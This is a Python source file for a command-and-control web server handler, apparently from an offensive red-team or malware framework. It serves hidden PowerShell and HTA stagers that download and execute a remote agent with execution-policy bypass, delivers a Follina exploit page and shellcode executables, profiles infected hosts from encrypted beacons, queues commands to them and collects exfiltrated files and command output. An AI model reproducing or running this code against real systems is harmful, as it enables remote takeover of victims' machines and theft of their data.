import http.server
import json
import base64
import os
import time
from core.utils.client_identity import extract_system_info

class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler for C2 communications
    Handles client check-ins, commands, and file transfers with encryption
    """
    
    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name):
        self.client_manager = client_manager
        self.logger = logger
        self.crypto_manager = crypto_manager
        self.campaign_name = campaign_name
        super().__init__(request, client_address, server)

    def log_message(self, format, *args):
        self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")

    def do_GET(self):
        # Log the request details
        self.log_message(f"Received GET request for {self.path}")

        # Route requests to appropriate handlers
        handlers = {
            "/raw_agent": self.send_agent_response,
            "/hta_agent": self.send_hta_response,
            "/hjf_agent": self.send_hjf_response,
            "/hjfs_agent": self.send_hjfs_response,
            "/b64_stager": self.send_b64_stager_response,
            "/b52_stager": self.send_b52_stager_response,
            "/b52_agent": self.send_b52_agent_response,
            "/follina_url": self.send_follina_response,
            "/beacon": self.handle_beacon
        }
        
        # Check for specific handlers
        if self.path in handlers:
            handlers[self.path]()
        # Special case for binary downloads
        elif self.path.startswith("/shellcode_x64.exe"):
            self.send_shellcode_x64_exe()
        elif self.path.startswith("/shellcode_x86.exe"):
            self.send_shellcode_x86_exe()
        else:
            # Default response for unmatched paths
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            message = "<html><body><h1>Welcome to the C2 Webserver!</h1></body></html>"
            self.wfile.write(message.encode("utf-8"))
    
    def handle_beacon(self):
        """Process check-in requests from clients"""
        ip = self.client_address[0]
        self.logger(f"Beacon received from {ip}")
        
        # Check for system information in headers
        system_info_encrypted = self.headers.get('X-System-Info')
        
        # Extract possible client identifier from headers
        client_identifier = self.headers.get('X-Client-ID')
        
        if system_info_encrypted:
            try:
                # Decrypt the system information
                system_info_json = self.crypto_manager.decrypt(system_info_encrypted)
                
                # Extract key system properties
                hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
                
                # Add IP to system info
                system_info['ip'] = ip
                
                # Add unique client identifier if provided
                if client_identifier:
                    system_info['client_identifier'] = client_identifier
                
                # Register the client with enhanced information
                client_id = self.client_manager.add_client(
                    ip=ip,
                    hostname=hostname,
                    username=username,
                    machine_guid=machine_guid,
                    os_version=os_version,
                    mac_address=mac_address,
                    system_info=system_info
                )
                
                # Verify client identity if verifier is available
                if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
                    verifier = self.server.client_verifier
                    is_verified, confidence, warnings = verifier.verify_client(client_id, system_info)
                    
                    # Update client verification status
                    self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
                    
                    if not is_verified:
                        warning_str = ", ".join(warnings)
                        self.logger(f"WARNING: Client {client_id} identity suspicious (confidence: {confidence:.1f}%): {warning_str}")
                    
                    # Register/update this client information for future reference
                    verifier.register_client(client_id, system_info)
                
                self.logger(f"Client identified as {client_id} ({hostname}/{username})")
            except Exception as e:
                self.logger(f"Error processing system information: {str(e)}")
                # Fall back to IP-based identification
                client_id = ip
                self.client_manager.add_client(client_id)
        else:
            # Fall back to IP-based identification for compatibility
            client_id = ip
            self.client_manager.add_client(client_id)
        
        # Process commands to send to client
        commands = self.client_manager.get_pending_commands(client_id)
        self.logger(f"Commands to send to client {client_id}: {commands}")
        
        # Log the command sent to the client
        for command in commands:
            self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args']}")
        
        # Encrypt commands json before sending
        commands_json = json.dumps(commands)
        encrypted_commands = self.crypto_manager.encrypt(commands_json)
        
        # Send encrypted data
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.end_headers()
        self.wfile.write(encrypted_commands.encode("utf-8"))
        self.client_manager.clear_pending_commands(client_id)

    def _get_campaign_name(self):
        """Helper method to get the active campaign name"""
        # Use the campaign name provided during initialization if available
        if self.campaign_name:
            return self.campaign_name
            
        # Otherwise, try to find campaign directories
        campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
        if not campaign_dirs:
            return None
        # For now, just use the first campaign found
        return campaign_dirs[0][:-9]  # Remove "_campaign" suffix
    
    def send_agent_response(self):
        """Send the PowerShell agent code"""
        from core.utils.agent_generator import generate_agent_code
        
        # Get the key as base64
        key_base64 = self.crypto_manager.get_key_base64()
        server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
        
        # Generate the agent code
        agent_code = generate_agent_code(key_base64, server_address)

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))

    def send_hta_response(self):
        """Send an HTA loader that will download and execute the PowerShell agent"""
        hta_code = """
<script>
    new ActiveXObject("WScript.Shell").Run("powershell -w hidden -nop -ep bypass -c \\"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/raw_agent')\\"");
    window.close();
</script>
"""
        hta_code = hta_code.replace("{ip}", self.server.server_address[0]).replace("{port}", str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(hta_code.encode("utf-8"))

    def send_hjf_response(self):
        """Send a simple PowerShell loader that will download and execute the agent"""
        hjf_code = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
IEX($s)
"""
        hjf_code = hjf_code.replace("{ip}", self.server.server_address[0]).replace("{port}", str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(hjf_code.encode("utf-8"))

    def send_hjfs_response(self):
        """Send PowerShell loader with system proxy support"""
        hjfs_code = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
IEX($s)
"""
        hjfs_code = hjfs_code.replace("{ip}", self.server.server_address[0]).replace("{port}", str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(hjfs_code.encode("utf-8"))
    
    def send_b64_stager_response(self):
        """Send a Base64 encoded stager that will download and execute the agent"""
        raw_agent = "/raw_agent"
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{raw_agent}');IEX($S)"
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(stager_code.encode("utf-8"))
    
    def send_b52_stager_response(self):
        """Send a Base52 encoded stager that will download and execute the agent"""
        b52_agent = "/b52_agent"
        stager_code = f"IEX((New-Object Net.WebClient).DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{b52_agent}'))"
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(stager_code.encode("utf-8"))

    def send_b52_agent_response(self):
        """Send Base52 encoded agent"""
        raw_agent = "/raw_agent"
        agent_code = f"IEX((New-Object Net.WebClient).DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{raw_agent}'))"
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))

    def send_follina_response(self):
        """Send Follina exploit HTML"""
        # Read the content of follina.html
        campaign_name = self._get_campaign_name()
        if not campaign_name:
            self.send_error(404, "Campaign not found")
            return
            
        campaign_folder = campaign_name + "_campaign"
        agents_folder = os.path.join(campaign_folder, "agents")
        file_path = os.path.join(agents_folder, "follina.html")

        if os.path.exists(file_path):
            with open(file_path, 'r') as file:
                follina_content = file.read()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(follina_content.encode("utf-8"))
        else:
            self.send_error(404, "Follina HTML file not found.")

    def send_shellcode_x64_exe(self):
        """Send the x64 shellcode executable"""
        campaign_name = self._get_campaign_name()
        if not campaign_name:
            self.send_error(404, "Campaign not found")
            return
            
        agents_folder = os.path.join(campaign_name + "_campaign", "agents")
        file_path = os.path.join(agents_folder, "shellcode_x64.exe")
        
        if os.path.exists(file_path):
            self.send_response(200)
            self.send_header("Content-type", "application/octet-stream")
            self.send_header("Content-Disposition", "attachment; filename=shellcode_x64.exe")
            self.end_headers()
            
            with open(file_path, "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404, "Shellcode executable not found")
    
    def send_shellcode_x86_exe(self):
        """Send the x86 shellcode executable"""
        campaign_name = self._get_campaign_name()
        if not campaign_name:
            self.send_error(404, "Campaign not found")
            return
            
        agents_folder = os.path.join(campaign_name + "_campaign", "agents")
        file_path = os.path.join(agents_folder, "shellcode_x86.exe")
        
        if os.path.exists(file_path):
            self.send_response(200)
            self.send_header("Content-type", "application/octet-stream")
            self.send_header("Content-Disposition", "attachment; filename=shellcode_x86.exe")
            self.end_headers()
            
            with open(file_path, "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404, "Shellcode executable not found")

    def do_POST(self):
        """Handle POST requests for command results and file uploads"""
        # Log the request details
        self.log_message(f"Received POST request for {self.path}")

        if self.path == "/command_result":
            self.handle_command_result()
        elif self.path == "/file_upload":
            self.handle_file_upload()
        else:
            self.send_response(404)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Not Found")

    def handle_command_result(self):
        """Process command results sent from clients"""
        ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        # Extract possible client identifier from headers
        client_identifier = self.headers.get('X-Client-ID')
        if client_identifier:
            # If we have a client identifier header, use it for logging
            self.logger(f"Result received from client ID {client_identifier} (IP: {ip})")
        
        # Decrypt the result
        try:
            result_data = self.crypto_manager.decrypt(encrypted_data)
            
            # Try to parse the result as JSON
            try:
                result_json = json.loads(result_data)
                if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                    # This is a structured result with timestamp
                    timestamp = result_json['timestamp']
                    result = result_json['result']
                    
                    # Find the client by either client_id or IP
                    client_found = False
                    for client_id, client_info in self.client_manager.get_clients_info().items():
                        # Check if this client has the matching client_identifier
                        if client_identifier and client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                            self.client_manager.add_command_result(client_id, timestamp, result)
                            self.logger(f"Result processed for client {client_id} (timestamp: {timestamp})")
                            client_found = True
                            break
                        # Fallback to IP if no client_identifier match
                        if client_info.get('ip') == ip:
                            self.client_manager.add_command_result(client_id, timestamp, result)
                            self.logger(f"Result processed for client {client_id} by IP match (timestamp: {timestamp})")
                            client_found = True
                            break
                    
                    if not client_found:
                        # If no client was found, log as a generic result
                        self.logger(f"Result received from unknown client {ip}: {result_data}")
                        self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
                else:
                    # Unstructured result, log as is
                    self.logger(f"Result received from {ip}: {result_data}")
                    
                    # Try to find client by IP
                    for client_id, client_info in self.client_manager.get_clients_info().items():
                        if client_info.get('ip') == ip:
                            self.client_manager.log_event(client_id, "Command Result Received", f"{result_data}")
                            break
                    else:
                        self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
            except json.JSONDecodeError:
                # Not JSON, treat as plain text result
                self.logger(f"Result received from {ip}: {result_data}")
                
                # Try to find client by IP
                for client_id, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('ip') == ip:
                        self.client_manager.log_event(client_id, "Command Result Received", f"{result_data}")
                        break
                else:
                    self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
            
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Command result received.")
        except Exception as e:
            self.logger(f"Error decrypting result from {ip}: {str(e)}")
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Failed to process command result.")

    def handle_file_upload(self):
        """Process file uploads from clients"""
        ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            # Decrypt the file data
            file_content = self.crypto_manager.decrypt(encrypted_data)
            
            # Extract client identifier from headers if present
            client_identifier = self.headers.get('X-Client-ID')
            
            # Create uploads directory if it doesn't exist
            campaign_name = self._get_campaign_name()
            if not campaign_name:
                self.send_error(500, "Campaign not found")
                return
                
            campaign_folder = campaign_name + "_campaign"
            
            # Try to determine client ID from the identifier or IP
            client_id = None
            if client_identifier:
                for cid, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                        client_id = cid
                        break
            
            if not client_id:
                # Try to find by IP
                for cid, client_info in self.client_manager.get_clients_info().items():
                    if client_info.get('ip') == ip:
                        client_id = cid
                        break
            
            # Fallback to IP if no client ID found
            uploads_folder = os.path.join(campaign_folder, "uploads", client_id or ip)
            os.makedirs(uploads_folder, exist_ok=True)
            
            # Try to parse as JSON (might be a file info structure)
            try:
                file_info = json.loads(file_content)
                if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                    # This is a structured file upload
                    file_name = file_info['FileName']
                    file_content_base64 = file_info['FileContent']
                    file_content_bytes = base64.b64decode(file_content_base64)
                    
                    file_path = os.path.join(uploads_folder, file_name)
                    with open(file_path, 'wb') as f:
                        f.write(file_content_bytes)
                    
                    self.logger(f"File uploaded from {client_id or ip}: {file_name} ({len(file_content_bytes)} bytes)")
                    if client_id:
                        self.client_manager.log_event(client_id, "File Upload", f"File saved to {file_path}")
                else:
                    # Not a structured file upload, save as raw text
                    timestamp = time.strftime("%Y%m%d-%H%M%S")
                    file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
                    
                    with open(file_path, 'w') as f:
                        f.write(file_content)
                        
                    self.logger(f"Raw text uploaded from {client_id or ip} and saved to {file_path}")
                    if client_id:
                        self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            except json.JSONDecodeError:
                # Not JSON, save as raw text
                timestamp = time.strftime("%Y%m%d-%H%M%S")
                file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
                
                with open(file_path, 'w') as f:
                    f.write(file_content)
                    
                self.logger(f"Raw text uploaded from {client_id or ip} and saved to {file_path}")
                if client_id:
                    self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"File upload successful")
            
        except Exception as e:
            self.logger(f"Error handling file upload from {ip}: {str(e)}")
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(f"File upload failed: {str(e)}".encode('utf-8'))